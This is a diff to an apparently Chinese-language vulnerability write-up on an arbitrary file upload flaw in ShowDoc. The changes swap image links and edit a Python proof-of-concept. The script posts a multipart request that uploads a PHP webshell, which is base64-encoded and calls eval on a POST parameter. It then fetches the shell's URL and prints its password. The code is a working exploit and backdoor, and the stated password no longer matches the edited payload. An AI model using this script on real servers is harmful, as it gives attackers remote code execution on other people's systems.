@@ -20,7 +20,7 @@ ShowDoc 存在任意文件上传漏洞，攻击者通过构造特殊的数据包
 
 网站首页如下
 
-![](image/sh-1.png)
+![](http://wikioss.peiqi.tech/vuln/sh-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 构造如下数据包上传php文件
 
@@ -40,11 +40,11 @@ Content-Type: text/plain
 ----------------------------921378126371623762173617--
 ```
 
-![](image/sh-2.png)
+![](http://wikioss.peiqi.tech/vuln/sh-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 访问回显的路径
 
-![](image/sh-3.png)
+![](http://wikioss.peiqi.tech/vuln/sh-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## 漏洞POC
 
@@ -70,7 +70,7 @@ def POC_1(target_url):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
             "Content-Type": "multipart/form-data; boundary=--------------------------921378126371623762173617"
     }
-    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocCBlY2hvICdwcV90ZXN0JztAZXZhbCgkX1BPU1RbcGVpcWldKT8+Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS05MjEzNzgxMjYzNzE2MjM3NjIxNzM2MTctLQ==")
+    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocCBlY2hvICd0ZXN0X3Rlc3QnO0BldmFsKCRfUE9TVFt0ZXN0XSk/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOTIxMzc4MTI2MzcxNjIzNzYyMTczNjE3LS0=")
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
@@ -78,7 +78,7 @@ def POC_1(target_url):
             webshell_url = re.findall(r'"url":"(.*?)"', response.text)[0]
             webshell_url = webshell_url.replace('\\','')
             response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5)
-            if "pq_test" in response.text and response.status_code == 200:
+            if "test_test" in response.text and response.status_code == 200:
                 print("\033[32m[o] 目标 {}存在漏洞 ,成功上传木马 \n[o] 路径为 {}\033[0m".format(target_url, webshell_url))
                 print("\033[32m[o] 密码为: peiqi \033[0m")
             else:
@@ -96,4 +96,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](image/sh-4.png)
+![](http://wikioss.peiqi.tech/vuln/sh-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
